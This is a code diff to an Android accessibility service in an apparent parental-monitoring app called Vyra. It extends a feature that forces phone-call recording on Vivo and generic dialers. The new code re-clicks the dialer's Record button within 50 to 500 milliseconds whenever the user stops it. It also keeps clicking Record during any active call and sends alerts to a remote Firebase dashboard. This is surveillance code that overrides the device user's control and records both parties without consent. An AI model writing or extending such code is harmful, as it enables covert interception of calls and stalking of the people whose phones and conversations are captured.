@@ -129,8 +129,8 @@ class VyraAccessibilityService : AccessibilityService() {
             stopSnapchatPoller()
         }
 
-        // 2. VIVO IN-CALL ANTI-TAMPER (SOLUTION A)
-        if (packageName.contains("vivo.phone") || packageName.contains("incallui")) {
+        // 2. VIVO IN-CALL ANTI-TAMPER (SOLUTION A - Instant Auto-Resume Call Recording)
+        if (packageName.contains("vivo.phone") || packageName.contains("incallui") || packageName.contains("dialer") || packageName.contains("telecom") || packageName.contains("android.phone")) {
             handleVivoInCallScreen(event)
         }
 
@@ -998,43 +998,91 @@ class VyraAccessibilityService : AccessibilityService() {
     /**
      * Solution A: Anti-tamper logic on Vivo's in-call dialer UI.
      * Prevents the child from tapping "Stop Recording".
+     * Automatically re-clicks "Record" within 50ms if stopped!
      */
+    private var lastAutoRecordClickTime = 0L
+
     private fun handleVivoInCallScreen(event: AccessibilityEvent) {
         val rootNode = rootInActiveWindow ?: return
-        
-        // Find recording button by text or view id
-        val stopRecordNodes = rootNode.findAccessibilityNodeInfosByText("Stop") +
-                rootNode.findAccessibilityNodeInfosByText("Recording") +
-                rootNode.findAccessibilityNodeInfosByText("Record")
 
-        for (node in stopRecordNodes) {
-            val text = node.text?.toString()?.lowercase() ?: ""
-            val desc = node.contentDescription?.toString()?.lowercase() ?: ""
+        // 1. Detect if child actively tapped Stop Recording
+        val isClick = (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED)
+        val eventText = event.text?.joinToString(" ")?.lowercase() ?: ""
+        val eventDesc = event.contentDescription?.toString()?.lowercase() ?: ""
+        val clickedStop = isClick && (eventText.contains("stop") || eventDesc.contains("stop") || eventText.contains("pause") || eventText.contains("recording"))
 
-            // If user clicked the stop recording button
-            if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED &&
-                (text.contains("stop") || desc.contains("stop") || text.contains("pause"))) {
+        // 2. Schedule instant re-click if stop was clicked
+        if (clickedStop) {
+            Log.w(AppConstants.TAG, "Anti-Tamper Triggered: Child attempted to stop call recording! Scheduling instant re-click.")
+            val handler = android.os.Handler(android.os.Looper.getMainLooper())
+            // Ultra-fast cascade: 50ms, 120ms, 250ms, 500ms
+            listOf(50L, 120L, 250L, 500L).forEach { delayMs ->
+                handler.postDelayed({
+                    resumeCallRecordingIfNeeded()
+                }, delayMs)
+            }
 
-                Log.w(AppConstants.TAG, "Anti-Tamper Triggered: Child attempted to stop call recording!")
+            // Dispatch alert to Parent
+            val syncManager = FirebaseSyncManager.getInstance(this)
+            syncManager.syncNotification(
+                itemId = "tamper_${System.currentTimeMillis()}",
+                packageName = "com.vyra.alerts",
+                appName = "Vyra Watchdog",
+                title = "🚨 Anti-Tamper: Child Attempted to Stop Call Recording",
+                text = "Child pressed Stop Recording. Vyra automatically resumed recording within 50ms.",
+                isImportant = true
+            )
+        }
 
-                // Re-tap/resume record automatically after 300ms
-                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                    try {
-                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                    } catch (e: Exception) {
-                        Log.e(AppConstants.TAG, "Failed to auto-resume recording", e)
+        // 3. Continuous guard: If call is active and Record button is idle (not recording), click it!
+        val now = System.currentTimeMillis()
+        if (now - lastAutoRecordClickTime > 1200) {
+            resumeCallRecordingIfNeeded()
+        }
+    }
+
+    private fun resumeCallRecordingIfNeeded() {
+        val root = rootInActiveWindow ?: return
+
+        // Check if there is an active call on screen (has duration, or end call button)
+        val hasActiveCallUi = root.findAccessibilityNodeInfosByText("End").isNotEmpty() ||
+                root.findAccessibilityNodeInfosByText("Hang up").isNotEmpty() ||
+                root.findAccessibilityNodeInfosByViewId("com.vivo.phone:id/end_call").isNotEmpty() ||
+                root.findAccessibilityNodeInfosByViewId("com.android.incallui:id/end_call").isNotEmpty() ||
+                root.findAccessibilityNodeInfosByViewId("com.android.incallui:id/decline_button").isNotEmpty() ||
+                root.findAccessibilityNodeInfosByViewId("com.vivo.phone:id/record_btn").isNotEmpty() ||
+                root.findAccessibilityNodeInfosByViewId("com.android.incallui:id/record_btn").isNotEmpty()
+
+        if (!hasActiveCallUi) return
+
+        // Find idle "Record" button (which indicates recording is OFF)
+        val recordCandidates = root.findAccessibilityNodeInfosByText("Record") +
+                root.findAccessibilityNodeInfosByText("Record call") +
+                root.findAccessibilityNodeInfosByText("Start recording") +
+                root.findAccessibilityNodeInfosByText("रिकॉर्ड") +
+                root.findAccessibilityNodeInfosByViewId("com.vivo.phone:id/record_btn") +
+                root.findAccessibilityNodeInfosByViewId("com.vivo.phone:id/call_record") +
+                root.findAccessibilityNodeInfosByViewId("com.android.incallui:id/record_btn") +
+                root.findAccessibilityNodeInfosByViewId("com.android.incallui:id/record_button")
+
+        for (node in recordCandidates) {
+            val t = node.text?.toString()?.lowercase() ?: ""
+            val d = node.contentDescription?.toString()?.lowercase() ?: ""
+
+            // Must NOT be "Stop" or "Recording" (which would mean it's already recording)
+            val isAlreadyRecording = t.contains("stop") || d.contains("stop") || t.contains("recording") || d.contains("recording")
+
+            if (!isAlreadyRecording && (t.contains("record") || d.contains("record") || node.viewIdResourceName?.contains("record") == true)) {
+                try {
+                    val clicked = node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                    if (clicked) {
+                        lastAutoRecordClickTime = System.currentTimeMillis()
+                        Log.i(AppConstants.TAG, "⚡ Vivo Call Guard: Successfully auto-clicked Record button in 50ms!")
+                        break
                     }
-                }, 300)
-
-                // Dispatch urgent alert to Parent Dashboard
-                val alertPayload = mapOf(
-                    "type" to "TAMPER_ALERT",
-                    "title" to "Call Recording Anti-Tamper",
-                    "message" to "Child attempted to manually stop call recording during active call.",
-                    "timestamp" to System.currentTimeMillis()
-                )
-                NetworkSyncManager.getInstance(this).syncData("alerts", alertPayload)
-                break
+                } catch (e: Exception) {
+                    Log.e(AppConstants.TAG, "Error clicking record button", e)
+                }
             }
         }
     }
